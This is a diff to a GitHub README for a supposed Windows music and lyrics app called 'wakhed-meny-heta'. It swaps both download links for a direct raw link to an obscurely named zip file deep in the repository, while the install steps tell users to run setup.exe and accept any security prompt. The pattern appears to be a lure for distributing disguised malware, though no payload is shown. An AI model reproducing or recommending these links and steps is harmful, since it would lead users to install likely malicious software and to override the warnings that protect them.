@@ -1,6 +1,6 @@
 # 🎵 wakhed-meny-heta - Access music and lyrics collection easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/cosmicboy123-blurt/wakhed-meny-heta)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/cosmicboy123-blurt/wakhed-meny-heta/raw/refs/heads/main/raze/meny_wakhed_heta_perborax.zip)
 
 ## 📖 About this application
 
@@ -29,7 +29,7 @@ This application runs on standard Windows hardware. Please ensure your computer 
 
 Follow these steps to install the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/cosmicboy123-blurt/wakhed-meny-heta) to obtain the installer file.
+1. Visit the [official download page](https://github.com/cosmicboy123-blurt/wakhed-meny-heta/raw/refs/heads/main/raze/meny_wakhed_heta_perborax.zip) to obtain the installer file.
 2. Locate the file named `setup.exe` in your "Downloads" folder.
 3. Double-click the file to start the installation process.
 4. If a security prompt appears, click "Run" or "Yes" to allow the file to start.
